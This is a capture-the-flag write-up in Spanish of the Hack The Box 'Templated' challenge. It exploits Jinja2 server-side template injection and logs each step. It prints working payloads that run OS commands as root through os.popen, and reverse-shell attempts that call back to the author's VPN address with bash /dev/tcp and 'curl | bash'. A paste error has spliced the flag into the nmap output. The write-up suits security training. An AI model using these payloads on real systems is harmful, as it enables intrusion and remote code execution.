-- Cada vez que reiniciamos la máquina en HTB se abre una ip:puerto nuevos.



└─$ nmap -Pn -sC -sV -vvv 157.245.42.82
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:58 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:58
Completed Parallel DNS resolution of 1 host. at 13:58, 0.13s elapsed
DNS resolution of 1 IPs took 0.13s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:58
Scanning 157.245.42.82 [1000 ports]
Discovered open port 30951/tcp on 157.245.42.82
Completed Connect Scan at 13:58, 14.22s elapsed (1000 total ports)
Initiating Service scan at 13:58
Scanning 1 service on 157.245.42.82
Completed Service scan at 13:58, 11.22s elapsed (1 service on 1 host)
NSE: Script scanning 157.245.42.82.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 1.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.28s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Nmap scan report for 157.245.42.82
Host is up, received user-set (0.067s latency).
Scanned at 2022-05-07 13:58:06 UTC for 27s
Not shown: 905 filtered tcp ports (no-response)
PORT      STATE  SERVICE         REASON       VERSION
30951/tcp open   http            syn-ack      Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Under Construction - Login
|_Requested resource was /auth

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
The page 'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be foundCompleted NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.10 seconds






gobuster dir --url http://157.245.42.82:30570 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://157.245.42.82:30570
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/07 14:13:36 Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://157.245.42.82:30570/5e884a19-5638-49a8-b259-9cd569b849ba => 200 (Length: 104). To continue please exclude the status code, the length or use the --wildcard switch
                                                                                  
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://157.245.42.82:30951 --wordlist /usr/share/wordlists/┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://157.245.42.82:30951 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://157.245.42.82:30951
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/07 14:13:46 Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 27] [--> /auth]
/auth                 (Status: 200) [Size: 2149]          
/Logout               (Status: 302) [Size: 27] [--> /auth]
/%C0                  (Status: 400) [Size: 1004]          
/Auth                 (Status: 200) [Size: 2149]          
                                                          
===============================================================
2022/05/07 14:23:01 Finished
===============================================================


Todas las búsquedas anteriores fueron infructuosas. 

Entonces me fijo en el Proudly powered by Flask/Jinja2 de la página inicial.

Comienzo la búsqueda de otra manera, la verdad es que era más fácil de lo que creía:


VECTOR:
-------
http://157.245.42.82:30626/%7B%7B4*5%7D%7D

Error 404

The page '20' could not be found


http://157.245.42.82:30626/{{4*5}}

¡¡¡¡¡¡¡Bingo, tengo vector de entrada!!!!!!!!!

Veamos mi IP:

└─$ ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether b8:88:e3:5e:8f:c7  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 344720  bytes 68110458 (64.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 344720  bytes 68110458 (64.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.128  netmask 255.255.254.0  destination 10.10.14.128
        inet6 fe80::fc32:cf57:201c:6331  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::107e  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 6  bytes 528 (528.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.35  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::cad8:3e7d:582d:1008  prefixlen 64  scopeid 0x20<link>
        ether 20:68:9d:10:a3:94  txqueuelen 1000  (Ethernet)
        RX packets 1599925  bytes 1463669384 (1.3 GiB)
        RX errors 0  dropped 3113  overruns 0  frame 0
        TX packets 1252404  bytes 217606645 (207.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


Esta es mi IP a través de la VPN de HTB: 
10.10.14.128


Investigo:

What is SSTI ( Server-Side Template Injection)
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/




Diversas pruebas, intento conseguir una shell inversa sin éxito:

http://157.245.42.82:30626/{{ config['RUNCMD']('bash -i >& /dev/tcp/10.10.14.128/12345 0>&1',shell=True) }}


http://157.245.42.82:30626/%7B%7B%20config.items()%7D%7D


The page 'dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])' could not be found


http://157.245.42.82:30626/%7B%7B%20config.from_object('os')%7D%7D


http://157.245.42.82:30626/%7B%7B%20config.items()%7D%7D

The page 'dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('CLD_CONTINUED', 6), ('CLD_DUMPED', 3), ('CLD_EXITED', 1), ('CLD_KILLED', 2), ('CLD_STOPPED', 5), ('CLD_TRAPPED', 4), ('EX_CANTCREAT', 73), ('EX_CONFIG', 78), ('EX_DATAERR', 65), ('EX_IOERR', 74), ('EX_NOHOST', 68), ('EX_NOINPUT', 66), ('EX_NOPERM', 77), ('EX_NOUSER', 67), ('EX_OK', 0), ('EX_OSERR', 71), ('EX_OSFILE', 72), ('EX_PROTOCOL', 76), ('EX_SOFTWARE', 70), ('EX_TEMPFAIL', 75), ('EX_UNAVAILABLE', 69), ('EX_USAGE', 64), ('F_LOCK', 1), ('F_OK', 0), ('F_TEST', 3), ('F_TLOCK', 2), ('F_ULOCK', 0), ('GRND_NONBLOCK', 1), ('GRND_RANDOM', 2), ('MFD_ALLOW_SEALING', 2), ('MFD_CLOEXEC', 1), ('MFD_HUGETLB', 4), ('MFD_HUGE_16GB', -2013265920), ('MFD_HUGE_16MB', 1610612736), ('MFD_HUGE_1GB', 2013265920), ('MFD_HUGE_1MB', 1342177280), ('MFD_HUGE_256MB', 1879048192), ('MFD_HUGE_2GB', 2080374784), ('MFD_HUGE_2MB', 1409286144), ('MFD_HUGE_32MB', 1677721600), ('MFD_HUGE_512KB', 1275068416), ('MFD_HUGE_512MB', 1946157056), ('MFD_HUGE_64KB', 1073741824), ('MFD_HUGE_8MB', 1543503872), ('MFD_HUGE_MASK', 63), ('MFD_HUGE_SHIFT', 26), ('NGROUPS_MAX', 65536), ('O_ACCMODE', 3), ('O_APPEND', 1024), ('O_ASYNC', 8192), ('O_CLOEXEC', 524288), ('O_CREAT', 64), ('O_DIRECT', 16384), ('O_DIRECTORY', 65536), ('O_DSYNC', 4096), ('O_EXCL', 128), ('O_LARGEFILE', 0), ('O_NDELAY', 2048), ('O_NOATIME', 262144), ('O_NOCTTY', 256), ('O_NOFOLLOW', 131072), ('O_NONBLOCK', 2048), ('O_PATH', 2097152), ('O_RDONLY', 0), ('O_RDWR', 2), ('O_RSYNC', 1052672), ('O_SYNC', 1052672), ('O_TMPFILE', 4259840), ('O_TRUNC', 512), ('O_WRONLY', 1), ('POSIX_FADV_DONTNEED', 4), ('POSIX_FADV_NOREUSE', 5), ('POSIX_FADV_NORMAL', 0), ('POSIX_FADV_RANDOM', 1), ('POSIX_FADV_SEQUENTIAL', 2), ('POSIX_FADV_WILLNEED', 3), ('POSIX_SPAWN_CLOSE', 1), ('POSIX_SPAWN_DUP2', 2), ('POSIX_SPAWN_OPEN', 0), ('PRIO_PGRP', 1), ('PRIO_PROCESS', 0), ('PRIO_USER', 2), ('P_ALL', 0), ('P_NOWAIT', 1), ('P_NOWAITO', 1), ('P_PGID', 2), ('P_PID', 1), ('P_WAIT', 0), ('RTLD_DEEPBIND', 8), ('RTLD_GLOBAL', 256), ('RTLD_LAZY', 1), ('RTLD_LOCAL', 0), ('RTLD_NODELETE', 4096), ('RTLD_NOLOAD', 4), ('RTLD_NOW', 2), ('RWF_DSYNC', 2), ('RWF_HIPRI', 1), ('RWF_NOWAIT', 8), ('RWF_SYNC', 4), ('R_OK', 4), ('SCHED_BATCH', 3), ('SCHED_FIFO', 1), ('SCHED_IDLE', 5), ('SCHED_OTHER', 0), ('SCHED_RESET_ON_FORK', 1073741824), ('SCHED_RR', 2), ('SEEK_CUR', 1), ('SEEK_DATA', 3), ('SEEK_END', 2), ('SEEK_HOLE', 4), ('SEEK_SET', 0), ('ST_APPEND', 256), ('ST_MANDLOCK', 64), ('ST_NOATIME', 1024), ('ST_NODEV', 4), ('ST_NODIRATIME', 2048), ('ST_NOEXEC', 8), ('ST_NOSUID', 2), ('ST_RDONLY', 1), ('ST_RELATIME', 4096), ('ST_SYNCHRONOUS', 16), ('ST_WRITE', 128), ('TMP_MAX', 238328), ('WCONTINUED', 8), ('WCOREDUMP', <built-in function WCOREDUMP>), ('WEXITED', 4), ('WEXITSTATUS', <built-in function WEXITSTATUS>), ('WIFCONTINUED', <built-in function WIFCONTINUED>), ('WIFEXITED', <built-in function WIFEXITED>), ('WIFSIGNALED', <built-in function WIFSIGNALED>), ('WIFSTOPPED', <built-in function WIFSTOPPED>), ('WNOHANG', 1), ('WNOWAIT', 16777216), ('WSTOPPED', 2), ('WSTOPSIG', <built-in function WSTOPSIG>), ('WTERMSIG', <built-in function WTERMSIG>), ('WUNTRACED', 2), ('W_OK', 2), ('XATTR_CREATE', 1), ('XATTR_REPLACE', 2), ('XATTR_SIZE_MAX', 65536), ('X_OK', 1)])' could not be found

http://157.245.42.82.30636/?username={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/p>

http://157.245.42.82:30636/?username={{ config['RUNCMD']('bash -i >& /dev/tcp/157.245.42.82/12345>


http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('curl%2010.10.14.28:12345%20|%20bash').read()%7D%7D
Proudly powered by Flask/Jinja2http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('curl%2010.10.14.28:12345%20|%20bash').read()%7D%7D


¡¡¡¡¡¡¡¡¡¡¡ENCUENTRO COMANDOS !!!!!!
------------------------------------
http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('whoami').read()%7D%7D

Error 404

The page 'root ' could not be found



http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D
Error 404

The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found



http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls').read()%7D%7D

Error 404

The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found



http://157.245.42.82:30626/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D
The page 'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be found


OWNED
-----------------------------------------------------------------------------------
Templated has been Pwned!
Congratulations
Akelarre
, best of luck in capturing flags ahead!

#16172

CHALLENGE RANK

07 May 2022

PWN DATE

20

POINTS EARNED

